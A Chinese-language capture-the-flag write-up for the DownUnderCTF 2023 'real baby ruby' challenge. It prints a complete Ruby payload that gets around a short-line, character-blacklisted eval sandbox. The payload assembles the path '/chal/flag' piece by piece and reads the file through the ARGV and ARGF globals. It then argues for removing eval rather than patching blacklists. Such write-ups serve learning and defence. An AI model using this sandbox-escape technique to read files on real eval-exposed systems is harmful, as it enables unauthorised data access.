# DownUnderCTF 2023 real baby ruby Writeup

## 题目简述

本题在 `baby ruby` 的基础上继续限制输入：单行仍须少于 5 字符，同时禁止反引号和 `%`。flag 仍位于 `/chal/flag`。新增黑名单没有覆盖 Ruby 的短全局对象和 `ARGF` 文件读取路径。

## 解题过程

不使用反引号、格式字符串或命令执行，仍可用 `?x` 和 `<<` 分段构造文件名：

```ruby
A=''
B=?/
A<<B
B=?c
A<<B
B=?h
A<<B
B=?a
A<<B
B=?l
A<<B
B=?/
A<<B
B=?f
A<<B
B=?l
A<<B
B=?a
A<<B
B=?g
A<<B
```

随后利用 `$*` 和 `$<`：

```ruby
C=$*
C<<A
D=$<
p *D
```

`$*` 指向参数数组 `ARGV`；把 `/chal/flag` 放入其中后，`$<` 对应的 `ARGF` 会打开该文件。`p *D` 枚举并打印文件内容，得到：

```text
DUCTF{sorry_for_the_unintended,hope_this_was_better_:-)}
```

## 方法总结

新增两个字符黑名单没有改变根本问题：攻击者仍能在共享 `eval` 绑定中维护状态，并利用语言预置对象访问文件。修补单个已知 payload 往往只会形成旁路；正确边界应是移除 `eval`，或使用只解析允许语法的专用表达式解析器。
